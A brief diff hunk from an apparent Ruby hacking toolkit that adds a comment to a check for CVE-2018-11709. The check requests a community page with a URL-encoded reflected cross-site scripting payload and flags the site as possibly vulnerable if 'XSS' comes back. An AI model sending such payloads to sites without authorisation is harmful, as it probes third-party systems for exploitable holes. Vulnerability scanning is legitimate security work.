@@ -14,6 +14,7 @@ module Snackhack2
     def run
       wp = HTTParty.get(File.join(@site, '/index.php/community/?%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E'))
       if wp.code == 200
+        # if `XSS` is found it means the site MIGHT be vulnerable
         puts "[+] #{@site} is vulnerable to CVE-2018-11709..." if wp.match(/XSS/)
       else
         puts "[+] HTTP code #{wp.code}"
